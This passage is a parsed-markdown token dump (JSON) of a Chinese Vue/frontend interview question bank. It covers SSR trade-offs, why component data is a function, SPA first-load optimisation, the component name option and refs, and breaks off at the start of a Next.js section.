的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","text":"SSR有着更好的SEO、并且首屏加载速度更快等优点。不过它也有一些缺点，比如我们的开发条件会受到限制，服务器端渲染只支持beforeCreate和created两个钩子，当我们需要一些外部扩展库时需要特殊处理，服务端渲染应用程序也需要处于Node.js的运行环境。还有就是服务器会有更大的负载需求。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vue 组件的 data 为什么必须是函数？\\n\\n","depth":2,"text":"Vue 组件的 data 为什么必须是函数？","tokens":[{"type":"text","raw":"Vue 组件的 data 为什么必须是函数？","text":"Vue 组件的 data 为什么必须是函数？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* 一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* 一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","task":false,"loose":false,"text":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","tokens":[{"type":"text","raw":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","text":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","tokens":[{"type":"text","raw":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","text":"一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果data是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件不同的实例之间data不冲突，data必须是一个函数。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## vue 中的 spa 应用如何优化首屏加载速度?\\n\\n","depth":2,"text":"vue 中的 spa 应用如何优化首屏加载速度?","tokens":[{"type":"text","raw":"vue 中的 spa 应用如何优化首屏加载速度?","text":"vue 中的 spa 应用如何优化首屏加载速度?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"* 请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n\\n* 缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n\\n* gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n\\n* http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n\\n* 懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n\\n* 预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n\\n* 合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n\\n* 使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n\\n* 提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n\\n* 封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n\\n* 图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n\\n* 使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n\\n","task":false,"loose":true,"text":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n","tokens":[{"type":"text","raw":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。\\n","text":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。","tokens":[{"type":"text","raw":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。","text":"请求优化：CDN 将第三方的类库放到 CDN 上，能够大幅度减少生产环境中的项目体积，另外 CDN 能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。","escaped":false}]}]},{"type":"list_item","raw":"* 缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n\\n","task":false,"loose":true,"text":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n","tokens":[{"type":"text","raw":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验\\n","text":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验","tokens":[{"type":"text","raw":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验","text":"缓存：将长时间不会改变的第三方类库或者静态资源设置为强缓存，将 max-age 设置为一个非常长的时间，再将访问路径加上哈希达到哈希值变了以后保证获取到最新资源，好的缓存策略有助于减轻服务器的压力，并且显著的提升用户的体验","escaped":false}]}]},{"type":"list_item","raw":"* gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n\\n","task":false,"loose":true,"text":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n","tokens":[{"type":"text","raw":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。\\n","text":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。","tokens":[{"type":"text","raw":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。","text":"gzip：开启 gzip 压缩，通常开启 gzip 压缩能够有效的缩小传输资源的大小。","escaped":false}]}]},{"type":"list_item","raw":"* http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n\\n","task":false,"loose":true,"text":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n","tokens":[{"type":"text","raw":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。\\n","text":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。","tokens":[{"type":"text","raw":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。","text":"http2：如果系统首屏同一时间需要加载的静态资源非常多，但是浏览器对同域名的 tcp 连接数量是有限制的(chrome 为 6 个)超过规定数量的 tcp 连接，则必须要等到之前的请求收到响应后才能继续发送，而 http2 则可以在多个 tcp 连接中并发多个请求没有限制，在一些网络较差的环境开启 http2 性能提升尤为明显。","escaped":false}]}]},{"type":"list_item","raw":"* 懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n\\n","task":false,"loose":true,"text":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n","tokens":[{"type":"text","raw":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件\\n","text":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件","tokens":[{"type":"text","raw":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件","text":"懒加载：当 url 匹配到相应的路径时，通过 import 动态加载页面组件，这样首屏的代码量会大幅减少，webpack 会把动态加载的页面组件分离成单独的一个 chunk.js 文件","escaped":false}]}]},{"type":"list_item","raw":"* 预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n\\n","task":false,"loose":true,"text":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n","tokens":[{"type":"text","raw":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化\\n","text":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化","tokens":[{"type":"text","raw":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化","text":"预渲染：由于浏览器在渲染出页面之前，需要先加载和解析相应的 html、css 和 js 文件，为此会有一段白屏的时间，可以添加loading，或者骨架屏幕尽可能的减少白屏对用户的影响体积优化","escaped":false}]}]},{"type":"list_item","raw":"* 合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n\\n","task":false,"loose":true,"text":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n","tokens":[{"type":"text","raw":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积\\n","text":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积","tokens":[{"type":"text","raw":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积","text":"合理使用第三方库：对于一些第三方 ui 框架、类库，尽量使用按需加载，减少打包体积","escaped":false}]}]},{"type":"list_item","raw":"* 使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n\\n","task":false,"loose":true,"text":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n","tokens":[{"type":"text","raw":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化\\n","text":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化","tokens":[{"type":"text","raw":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化","text":"使用可视化工具分析打包后的模块体积：webpack-bundle- analyzer 这个插件在每次打包后能够更加直观的分析打包后模块的体积，再对其中比较大的模块进行优化","escaped":false}]}]},{"type":"list_item","raw":"* 提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n\\n","task":false,"loose":true,"text":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n","tokens":[{"type":"text","raw":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程\\n","text":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程","tokens":[{"type":"text","raw":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程","text":"提高代码使用率：利用代码分割，将脚本中无需立即调用的代码在代码构建时转变为异步加载的过程","escaped":false}]}]},{"type":"list_item","raw":"* 封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n\\n","task":false,"loose":true,"text":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n","tokens":[{"type":"text","raw":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化\\n","text":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化","tokens":[{"type":"text","raw":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化","text":"封装：构建良好的项目架构，按照项目需求就行全局组件，插件，过滤器，指令，utils 等做一 些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化","escaped":false}]}]},{"type":"list_item","raw":"* 图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n\\n","task":false,"loose":true,"text":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n","tokens":[{"type":"text","raw":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验\\n","text":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验","tokens":[{"type":"text","raw":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验","text":"图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验","escaped":false}]}]},{"type":"list_item","raw":"* 使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","task":false,"loose":true,"text":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","tokens":[{"type":"text","raw":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","text":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","tokens":[{"type":"text","raw":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","text":"使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 组件中写 name 选项有哪些好处？\\n\\n","depth":2,"text":"组件中写 name 选项有哪些好处？","tokens":[{"type":"text","raw":"组件中写 name 选项有哪些好处？","text":"组件中写 name 选项有哪些好处？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* 可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n\\n* 可以通过 name 属性实现缓存功能（keep-alive）\\n\\n* 可以通过 name 来识别组件（跨级组件通信时非常重要）\\n\\n* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n\\n","task":false,"loose":true,"text":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n","tokens":[{"type":"text","raw":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）\\n","text":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）","tokens":[{"type":"text","raw":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）","text":"可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）","escaped":false}]}]},{"type":"list_item","raw":"* 可以通过 name 属性实现缓存功能（keep-alive）\\n\\n","task":false,"loose":true,"text":"可以通过 name 属性实现缓存功能（keep-alive）\\n","tokens":[{"type":"text","raw":"可以通过 name 属性实现缓存功能（keep-alive）\\n","text":"可以通过 name 属性实现缓存功能（keep-alive）","tokens":[{"type":"text","raw":"可以通过 name 属性实现缓存功能（keep-alive）","text":"可以通过 name 属性实现缓存功能（keep-alive）","escaped":false}]}]},{"type":"list_item","raw":"* 可以通过 name 来识别组件（跨级组件通信时非常重要）\\n\\n","task":false,"loose":true,"text":"可以通过 name 来识别组件（跨级组件通信时非常重要）\\n","tokens":[{"type":"text","raw":"可以通过 name 来识别组件（跨级组件通信时非常重要）\\n","text":"可以通过 name 来识别组件（跨级组件通信时非常重要）","tokens":[{"type":"text","raw":"可以通过 name 来识别组件（跨级组件通信时非常重要）","text":"可以通过 name 来识别组件（跨级组件通信时非常重要）","escaped":false}]}]},{"type":"list_item","raw":"* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","task":false,"loose":true,"text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 说一下 ref 的作用是什么？\\n\\n","depth":2,"text":"说一下 ref 的作用是什么？","tokens":[{"type":"text","raw":"说一下 ref 的作用是什么？","text":"说一下 ref 的作用是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","text":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","tokens":[{"type":"text","raw":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","text":"ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* 如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n\\n* 基本用法，本页面获取 DOM 元素\\n\\n* 获取子组件中的 data\\n\\n* 调用子组件中的方法\\n\\n* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* 如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n\\n","task":false,"loose":true,"text":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n","tokens":[{"type":"text","raw":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素\\n","text":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素","tokens":[{"type":"text","raw":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素","text":"如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素","escaped":false}]}]},{"type":"list_item","raw":"* 基本用法，本页面获取 DOM 元素\\n\\n","task":false,"loose":true,"text":"基本用法，本页面获取 DOM 元素\\n","tokens":[{"type":"text","raw":"基本用法，本页面获取 DOM 元素\\n","text":"基本用法，本页面获取 DOM 元素","tokens":[{"type":"text","raw":"基本用法，本页面获取 DOM 元素","text":"基本用法，本页面获取 DOM 元素","escaped":false}]}]},{"type":"list_item","raw":"* 获取子组件中的 data\\n\\n","task":false,"loose":true,"text":"获取子组件中的 data\\n","tokens":[{"type":"text","raw":"获取子组件中的 data\\n","text":"获取子组件中的 data","tokens":[{"type":"text","raw":"获取子组件中的 data","text":"获取子组件中的 data","escaped":false}]}]},{"type":"list_item","raw":"* 调用子组件中的方法\\n\\n","task":false,"loose":true,"text":"调用子组件中的方法\\n","tokens":[{"type":"text","raw":"调用子组件中的方法\\n","text":"调用子组件中的方法","tokens":[{"type":"text","raw":"调用子组件中的方法","text":"调用子组件中的方法","escaped":false}]}]},{"type":"list_item","raw":"* 使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","task":false,"loose":true,"text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","tokens":[{"type":"text","raw":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","text":"使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的","escaped":false}]}]}]}]},{"key":"Next","content":"<h1>Next</h1>\\n<h2>Next.js 与 React 技术选型的区别在哪里？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 